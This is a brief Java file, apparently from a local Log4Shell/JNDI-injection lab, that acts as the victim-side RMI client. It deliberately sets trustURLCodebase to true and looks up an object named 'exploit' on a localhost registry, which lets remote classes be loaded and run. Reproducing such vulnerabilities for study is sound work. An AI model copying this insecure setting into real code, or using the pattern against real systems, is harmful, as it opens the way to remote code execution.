package Log4jRce;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

/**
 * Created by hfc on 2021/12/13.
 */
public class RmiClient {

    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:10087");
        Context ctx = new InitialContext(env);
        Object obj = ctx.lookup("exploit");
        System.out.println(obj == null);
        if (obj != null) {
            System.out.println(obj.toString());
        }
    }

}
